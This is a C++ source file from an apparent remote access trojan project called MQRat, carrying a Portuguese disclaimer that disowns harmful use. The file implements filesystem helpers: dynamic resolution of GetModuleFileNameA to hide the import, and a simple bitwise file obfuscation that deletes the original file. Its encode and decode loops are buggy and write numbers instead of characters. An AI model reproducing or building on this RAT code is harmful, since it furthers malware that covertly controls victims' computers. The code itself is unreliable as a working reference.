/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <fstream>
#include "fs.hpp"

using namespace std;
namespace fs = filesystem;

DWORD FS::GetModuleFilename(HMODULE hmodule, LPTSTR path, DWORD len)
{
	gmfn fGetModuleFileName = NULL;
	HINSTANCE kernel32_dll = NULL;
	DWORD dwGet = 0;

	kernel32_dll = LoadLibraryA("kernel32.dll");
	if(kernel32_dll)
	{
		fGetModuleFileName = (gmfn)GetProcAddress((HMODULE)kernel32_dll, "GetModuleFileNameA");
		if(fGetModuleFileName)
			dwGet = fGetModuleFileName(hmodule, path, len);

		FreeLibrary(kernel32_dll);
	}

	return dwGet;
}

string FS::GetFilename(string full_path)
{
	fs::path path(full_path);

	return path.filename().generic_string();
}

bool FS::EncodeFile(std::string from, std::string to)
{
	ifstream input(from, ios_base::in);
	ofstream output(to, ios_base::out);
	unsigned int ch;

	// Read file	
	while(!input.eof())
	{
		input >> ch;
		ch = input.get();
		
		// Encode character
		output << (~(ch)) + 0x56;
	}
	
	// Close files
	input.close();
	output.close();
	
	// Delete input file
	DeleteFileA(from.c_str());

	return true;
}

bool FS::DecodeFile(std::string from, std::string to)
{
	ifstream input(from, ios_base::in);
	ofstream output(to, ios_base::out);
	unsigned int ch;

	// Read file until end
	while(!input.eof())
	{
		input >> ch;

		// Decode character
		output << ~(ch - 0x56);
	}

	// Closes both files
	input.close();
	output.close();
	
	return true;
}
